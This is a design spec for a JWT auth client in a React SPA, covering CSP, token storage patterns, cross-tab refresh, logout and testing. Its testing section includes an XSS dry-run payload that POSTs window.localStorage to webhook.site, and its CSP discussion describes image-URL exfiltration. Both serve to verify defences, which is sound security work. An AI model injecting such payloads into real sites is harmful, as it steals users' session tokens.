# JWT Auth Frontend — React + TypeScript Implementation Plan

> Web counterpart to `spec/AUTH_JWT_BACKEND.md` and `spec/AUTH_JWT_MOBILE.md`. Defines the web SPA's auth client, the deliberate XSS tradeoff the user is accepting by choosing body-based JSON tokens over httpOnly cookies, and the tab-sync / lifetime UX details.
>
> Estimated effort: **~1 day** (one PR in the frontend repo).
> Risk: **Medium-high** — XSS becomes a credential-theft path. We mitigate with CSP and storage choice; we do not eliminate it. The user accepted this tradeoff when they specified "no cookies, body-based JWT."
>
> Depends on: backend ships `/account/login/`, `/account/refresh/`, `/account/logout/` per the backend spec.

## The XSS reality check — read this before anything else

With the previous cookie-based design, the auth token sat in an `HttpOnly` cookie. JavaScript could not read it; an XSS payload could ride along on requests (CSRF-style) but could not exfiltrate the credential to an attacker-controlled server.

With body-based JWT, **the access and refresh tokens live in JavaScript-reachable memory or storage**. Any successful XSS — a script injection, a malicious npm dependency that runs at load time, a tag manager misuse, a vulnerable third-party widget — can read both tokens and ship them to an attacker. The attacker then has the user's session until the refresh token expires.

This is an explicit downgrade from the cookie model. The user accepted it for mobile compatibility and uniform contract. Our job is to make XSS as hard as possible and to minimise the blast radius if it happens.

### The mitigations we ship

1. **A strict CSP**. Non-negotiable.
2. **Refresh token only in memory** (and a cold-start cookie path described below). Refresh token is never in `localStorage`.
3. **Access token in memory only**.
4. **No `dangerouslySetInnerHTML` without a sanitiser** in any user-controlled rendering path. Audit on PR.
5. **Subresource Integrity (SRI)** on every `<script src=...>` from a CDN.
6. **No inline scripts**. CSP blocks them.
7. **Trusted Types** where the browser supports it. Catches DOM-XSS sinks at runtime.
8. **Dependency audit on CI** (e.g. `npm audit --audit-level=high` non-blocking warning + `socket.dev` or `snyk` for supply-chain).

### CSP recommendation

Strict, hash-based, no `unsafe-inline`, no `unsafe-eval`:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'strict-dynamic' 'nonce-<random-per-response>';
  style-src 'self' 'unsafe-inline';   <- pragma; tighten to nonce later if the design system permits
  img-src 'self' data: https:;
  connect-src 'self' https://api.<our-domain>;
  font-src 'self' data:;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  require-trusted-types-for 'script';
```

`frame-ancestors 'none'` and `X-Frame-Options: DENY` block clickjacking. `connect-src` constrained to our API origin makes it dramatically harder for an injected script to exfiltrate the token to `evil.example`. It does not eliminate exfiltration (an attacker can stuff data into an image URL `<img src="https://evil/?t=...">`, which is why we also constrain `img-src` and `default-src`), but it raises the bar substantially.

This goes in the **server-rendered HTML response** (Next.js middleware, an Nginx header, or a meta tag for static deploys — header is preferred).

### Token storage — recommendation

Two viable patterns. We pick the second:

- **Pattern A — both tokens in `localStorage`.** Simple. Survives reloads. Read by anything in the JS context — including XSS. We **do not** recommend this even though the user picked body-based: there is still a strictly better option.
- **Pattern B (recommended) — both tokens in memory + the refresh token also mirrored into a short-lived first-party cookie that is `HttpOnly`, `Secure`, `SameSite=Strict`, `Path=/account/refresh`. ** This is a hybrid. The user said "no cookies," and the JSON-body contract is preserved — the API never *requires* a cookie. But we can still set one to survive a page reload. The cookie is scoped narrowly to `/account/refresh/`, so it is only sent to that single endpoint, never to data APIs. The JS code only ever sees the tokens via the in-memory store, except on cold start when it calls `/account/refresh/` once to bootstrap.

Why pattern B is strictly better than A:

- After a page reload, pattern A reads the refresh token from `localStorage` into JS, which is the moment of theft. Pattern B never exposes the refresh token to JS — the bootstrap `/refresh/` call carries the cookie, server reads it, server returns the new pair in JSON body, JS holds it in memory only.
- An XSS on the page can still call `/account/refresh/` from inside the user's origin (the cookie rides along), but the response goes to the page's JS (which the attacker controls) — so XSS still steals one token pair. **However**, the attacker cannot persist the refresh token off the page after the user closes the tab, because their script context dies with the tab. They get one session of access, not indefinite refresh.

If pattern B is too much engineering for v1 and the user wants a faster shipped milestone, pattern A is the acceptable fallback **with** the CSP above. Document the choice in the PR.

If a future migration goes the other way (httpOnly cookie + CSRF token), the contract is preserved — the API stays bearer-based; the cookie is a transport detail.

### What we are accepting

- An XSS that runs while a user is signed in **will** steal the live access token and (in pattern A) the refresh token. There is no client-side defense that fully prevents this. The mitigation is "don't get XSS'd in the first place" plus CSP plus narrowing the persistence window.
- This is consistent with the mobile model — mobile is not vulnerable to XSS but is vulnerable to a rooted/jailbroken device dump. Different threat, same outcome.

## Auth client wrapper

Mirror the mobile design exactly so the two clients are reasoning-compatible.

```
authClient/
  tokenStore.ts      // in-memory access + refresh, plus subscribe()
  refreshGate.ts     // single-flight refresh
  apiClient.ts       // axios (or fetch wrapper) with the two interceptors
  bootstrap.ts       // called once at app start: cold-start refresh from cookie
  tabSync.ts         // BroadcastChannel hookup
  events.ts          // 'authed' / 'logged-out' for the router
```

### Bootstrap (app load)

1. App mounts.
2. `bootstrap()` runs:
   - If the in-memory store already has a token (HMR / SPA navigation), skip.
   - Else, optimistically `POST /account/refresh/` with **no JSON body** — the refresh cookie (pattern B) carries the token. If using pattern A, read refresh from `localStorage` and POST it as JSON.
   - 200 → write the pair into the in-memory store. Emit `authed`.
   - 401 → the user is not signed in. Show the public app.
   - 5xx → show an error toast, retry policy is the user's choice (reload).
3. The router waits for `bootstrap()` to settle before rendering the first authed route. A brief skeleton is shown.

### Request interceptor

Identical to mobile:

- Attach `Authorization: Bearer <access>`.
- If access expires within 30 seconds, pre-emptively refresh.

### Response interceptor

Identical to mobile:

- 401 on a non-refresh, non-login request → call `refreshGate.refresh()` → on success, retry the original once; on failure, logout.
- 401 on `/refresh/` → logout immediately.

### Single-flight refresh

Same mutex pattern as mobile. One in-flight refresh per tab. (Across tabs see "Tab sync.")

## Tab sync

A user opens our app in two tabs. Tab A's access token expires; tab A refreshes; tab B is now holding a stale access token. Worse: tab A and tab B both expire simultaneously, both fire `/refresh/`, and the second one gets a revoked token and the backend kills the family → both tabs logged out.

### Solution — `BroadcastChannel('auth')`

Modern browsers support `BroadcastChannel`. (Firefox / Chrome / Safari ≥ 15.4. Fallback: `storage` event on `localStorage` writes of a sync key. Pattern A users get the fallback for free; pattern B uses the channel.)

Protocol:

| Event | Payload | Sender | Receiver action |
|---|---|---|---|
| `tokens-updated` | `{accessExp, refreshExp}` | tab that just refreshed | other tabs: re-read the in-memory store via a tab-leader (see below), or just refetch from the cookie path |
| `logged-out` | `{}` | tab that logged out (intentional or via 401-on-refresh) | other tabs: clear in-memory store, navigate to /login |

Cross-tab single-flight is harder because tabs cannot share in-memory state. Two approaches:

1. **Leader election** (Web Locks API: `navigator.locks.request('auth-refresh', ...)`). The first tab to acquire the lock performs the refresh; others wait on the lock then re-read tokens (in pattern B by calling `/refresh/` which is a no-op when the cookie still holds a valid refresh — but wait, the previous refresh just rotated it, so the others' `/refresh/` calls now get the new cookie value and a new pair). This is the cleanest.
2. **Last-writer-wins**: any tab can refresh, and on a successful refresh it broadcasts `tokens-updated`; other tabs that were mid-refresh accept the broadcast and discard their own response if it lost the race. Looser, but Web Locks is the recommended path.

Recommendation: Web Locks. It is widely supported (Chrome 69+, Safari 15.4+, Firefox 96+) and exactly what it was designed for.

### Storage-event fallback (pattern A only)

If we are on pattern A, write a `lastTokenUpdate` timestamp to `localStorage` on every refresh / logout. Other tabs listen on `storage` events and react.

## Session lifetime UX

- The app is "alive" as long as the refresh token is valid (30 days). The user should rarely see a logout under normal usage.
- **Idle timeout (optional, follow-up)**: configurable per-deployment idle limit (e.g. 8 hours of no activity → forced re-login) for staff users. Skip in v1 — the user did not ask for it. Documented as future work.
- **"You've been logged out" UX**: when the response interceptor triggers logout, navigate to `/login?reason=session_expired`. The login page reads the reason and shows a small inline message "Your session expired. Please sign in again." Never use a modal — the user is about to type their password, the modal is in the way.

## CSRF — no longer an issue (modulo the bootstrap cookie)

Bearer-token APIs are not CSRF-vulnerable: a browser does not auto-attach an `Authorization` header to cross-origin requests, so a malicious site cannot force the user's browser to make authed requests on their behalf.

**Caveat for pattern B**: the bootstrap refresh cookie *is* a cookie, so it *is* attached to cross-origin requests. The protections:

1. `SameSite=Strict` on the cookie. Cross-site requests do not carry it.
2. The cookie is `Path=/account/refresh/` — it is not sent to any other endpoint, so an attacker cannot use it to forge a data-mutating request elsewhere.
3. `/account/refresh/` only does one thing: rotate tokens and return a JSON body the attacker's site cannot read (CORS prevents `allow_credentials=true` cross-origin reads when we set `allow_credentials=false`, which the backend spec mandates).

A successful CSRF against `/refresh/` would force the user's browser to silently rotate their tokens — which they would have done themselves five minutes later anyway. There is no impact. Document this in the PR.

For all other endpoints, no cookies = no CSRF = no anti-CSRF tokens needed. This is a real simplification over the previous cookie model.

## Logout flow

User clicks Log out:

1. Show a brief "Logging out…" state (prevent double-click).
2. `POST /account/logout/` with the current refresh token in the body and the access token in the header. Best-effort: do not block on the response.
3. Clear the in-memory token store.
4. Pattern B: clear the bootstrap cookie. Easiest path is for the server to set a `Set-Cookie: <name>=; Max-Age=0` on the `/logout/` response — call that out in the backend implementation. Pattern A: remove the keys from `localStorage`.
5. Broadcast `logged-out` to other tabs.
6. Navigate to `/login`. Replace the history entry (not push) so the back button does not return to an authed page.

If the user closes the tab without logging out, the in-memory tokens vanish but the refresh cookie (or `localStorage` entry) persists. Next visit, bootstrap reuses it. This is the "stay logged in" behaviour.

## Redirect after login

- If the user landed on `/login` because of a 401, capture the original URL (`location.pathname + location.search`) and after a successful login navigate back to it (with sanitisation: only allow same-origin paths, no `javascript:` or `//evil.com`).
- If the user typed `/login` directly, redirect to the default authed landing (e.g. `/dashboard`).

## Error mapping

Same table as mobile (`spec/AUTH_JWT_MOBILE.md`). Web additions:

| Status | Endpoint | UI |
|---|---|---|
| 423 | login | Inline form error: "Too many sign-in attempts. Try again in 15 minutes." Honour `Retry-After`. |
| 429 | login | Inline form error: "You are going a little fast. Please wait a moment." |
| 5xx | any | A toast that does not redirect; do not log the user out for transient server errors. |

## Testing

DevTools workflow:

- **Happy path**: log in, open Network tab, watch for the `/login/` 200 with both tokens in the response body. No `Set-Cookie` for an access cookie (pattern B's narrow refresh cookie is fine). Make API calls — every one has `Authorization: Bearer ey...`.
- **Refresh path**: set the backend access TTL to 60 seconds. Wait, make a call → see one 401 → one `/refresh/` → original request retried. Console clean (no errors). DevTools Application → Storage shows the in-memory store updated.
- **Cross-tab logout**: open two tabs of the app. Log out in tab A. Tab B should navigate to `/login` within one event-loop tick.
- **Cross-tab refresh**: open two tabs. Trigger near-simultaneous expiry. With Web Locks, exactly one `/refresh/` request goes out (visible across both Network tabs). Both tabs continue working.
- **Replay test (dev only)**: copy the refresh token from the in-memory store via the console, call `/refresh/` from a separate fetch, then continue using the app in the page. The page's next refresh fails (the token it holds is now revoked); page logs out. This verifies family-kill works for web too.
- **XSS dry run**: inject `<script>fetch('https://webhook.site/...', {method:'POST', body: JSON.stringify(window.localStorage)})</script>` into a comment field or wherever XSS would land. Confirm:
  - CSP blocks the inline script (Console shows the CSP violation).
  - `localStorage` does **not** contain tokens (pattern B).
- **Logout offline**: airplane mode → click logout → UI returns to `/login`. When network returns, the user is already locally logged out; no zombie state.

Automation:

- Mock the API; assert one refresh fires for N concurrent 401s.
- Cypress / Playwright test for the cross-tab logout (Playwright supports multiple browser contexts).
- E2E for the login → bootstrap → reload → still logged in path.

## Acceptance

- The login response body contains `access_token` and `refresh_token`; neither is written to `localStorage` in pattern B. (Grep the diff for `localStorage.setItem`.)
- The bootstrap cookie (pattern B) is `HttpOnly`, `Secure`, `SameSite=Strict`, `Path=/account/refresh/`. Verified in DevTools → Application → Cookies.
- The CSP is delivered as an HTTP header on every HTML response. Verified by `curl -I` on the root.
- Exactly one `/account/refresh/` per cross-tab refresh event under load.
- Logging out in one tab logs out every tab within one event loop tick.
- All API errors except 401 / 423 / 429 / 503 are surfaced as toasts, not redirects.
- After a logout, the URL in the address bar is `/login` and the back button does not return to an authed page.
- After a hard reload while authed, bootstrap succeeds and the user stays on whatever route they were viewing.
- No `Authorization` header appears in any console / Sentry payload.

## Non-goals

- Idle-timeout / staff inactivity logout — future feature flag.
- Multi-account / account switcher — future.
- Web push notifications — out of scope of auth.
- Server-side rendering of authed pages (Next.js SSR with the bearer token) — explicitly punted; this spec assumes the app is a client-rendered SPA. If/when SSR-with-auth ships, the access token has to travel via the Next API route's server context, not the page itself; separate spec.
- Migrating to a httpOnly-cookie-with-CSRF-token contract — that is the *other* design we did not pick. Keeping the door open architecturally (the auth client abstracts the transport), but no work here.
